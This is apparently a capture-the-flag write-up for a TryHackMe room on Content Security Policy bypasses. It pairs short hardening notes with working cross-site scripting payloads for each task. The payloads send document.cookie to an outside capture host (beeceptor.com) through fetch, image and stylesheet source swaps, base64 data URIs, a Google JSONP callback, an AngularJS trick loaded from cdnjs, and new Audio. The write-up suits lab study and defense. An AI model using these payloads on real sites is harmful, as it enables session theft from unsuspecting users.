# [Content Security Policy writeup](https://tryhackme.com/room/csp)
### Tools
###### Blue Team
[Evaluator](https://csp-evaluator.withgoogle.com/)

[Hasher](https://report-uri.com/home/hash)

[Generator](https://report-uri.com/home/generate)

###### Red Team
[JSONP Bypass](https://github.com/A1vinSmith/JSONBee/blob/master/jsonp.txt)

[Exfiltrator](https://beeceptor.com/)

### Payload
```
fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)

eval(document.location='https://randomcsp.free.beeceptor.com/'.concat(document.cookie))
```

### Attack
###### task 1
```
<BODY ONLOAD=fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)>
```

###### task 2 (`script-src data:`)
```
<script src="data:application/javascript,fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)"></script>
```
The alternative way is using `data:;base64,iVBORw0KGgo...`

```
echo -n 'fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)' | base64

<script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ=="></script>
```

###### task 3 (`img-src *; script-src 'unsafe-inline'`)
```
<IMG id="randomcspsmith" SRC="">
<script>document.getElementById('randomcspsmith').src="https://randomcsp.free.beeceptor.com/" + document.cookie;</script>
```

###### task 4 (`style-src * 'self'; script-src 'nonce-abcdef'`)
```
<link id="randomcspsmith" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('randomcspsmith').href="https://randomcsp.free.beeceptor.com/" + document.cookie;</script>
```

###### task 5 (JSONP endpoints, `script-src 'unsafe-eval' *.google.com`)
```
<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://randomcsp.free.beeceptor.com/'.concat(document.cookie))"></script>
```

###### task 6 (Trust CDN? `script-src 'unsafe-eval' cdnjs.cloudflare.com`)
CDN is way too generous. They're not only providing dependence for your website also for the hackers. When setting up the script-src directive and its sources, you should pay special attention to what you're allowing to load. If you're loading a script from an external source such as a CDN, make sure you're specifying the full URL of the script or a nonce/SHA hash of it and not just the hostname where it's hosted at, unless you're 100% sure no scripts that could be used to bypass your policy are hosted there. For example, if you're including jQuery from cdnjs on your website, you should include the full URL of the script `script-src cdnjs.cloudflare.com/ajax/.../jquery.min.js` or the SHA256 hash in your policy. Most CDNs allow you to get the script hash somewhere on their site.

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>

{{$on.curry.call().document.location='https://randomcsp.free.beeceptor.com/' + $on.curry.call().document.cookie}}

</div>
```
https://cdnjs.com/
https://blog.0daylabs.com/2016/09/09/bypassing-csp/

###### task 7
After checking [Evaluator](https://csp-evaluator.withgoogle.com/)
```
default-src 'none';
media-src *;
style-src 'self';
script-src 'self'
```

'self' can be problematic if you host JSONP, Angular or user uploaded files.

`media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
Checking [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/media-src)

This one is the hardest and the best.
1. The 404 pages will show up whatever you put in. means this one match `can be problematic if you host JSONP, Angular or user uploaded files.`
2. Need to understand how `script-src 'self';` works. It means something like `ip:3008/defend-1.js` will be executed.
3. Then try to close the tag with `'`. `<script src="/'; alert(1); '"></script>` alert should just work.
4. What to do after fetch, window.open, document.location are blocked by CSP? The answer is `media-src` `new Audio`
5. Use relative path for the 404 page, also a browser won't block your input for `Phishing`
6. final answer is 
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----
-----


```
<script src="/'; new Audio('https://randomname.free.beeceptor.com/' + document.cookie); '"></script>
```


### Defend
###### task 1
script-src 'self';

###### task 2
script-src 'nonce-ae3b00';

###### task 3 (Inline JS)
[Hasher](https://report-uri.com/home/hash) to generate the hash for that inline javascript.
script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='


### Expand Knowledge
https://content-security-policy.com/#directive


Don't forget to give ⭐ on the github to motivate me to continue developing, cheers.
